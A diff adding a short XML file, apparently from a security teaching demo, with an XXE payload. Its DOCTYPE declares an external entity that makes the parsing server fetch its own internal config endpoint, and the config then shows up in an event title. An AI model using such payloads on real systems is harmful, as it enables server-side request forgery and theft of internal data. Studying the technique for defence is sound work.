@@ -1,0 +1,12 @@
+<?xml version="1.0"?>
+<!-- ATTACK: same idea as the basic demo, but SYSTEM makes the server go FETCH.
+     instead of a word, xxe = fetch http://localhost:4942/internal/config.
+     the server (not us) makes that request, from its own machine, so it passes
+     the localhost-only check. the config comes back inside the event title. -->
+<!DOCTYPE agenda [ <!ENTITY xxe SYSTEM "http://localhost:4942/internal/config"> ]>
+<agenda>
+  <event>
+    <title>&xxe;</title>
+    <date>2042-09-09</date>
+  </event>
+</agenda>
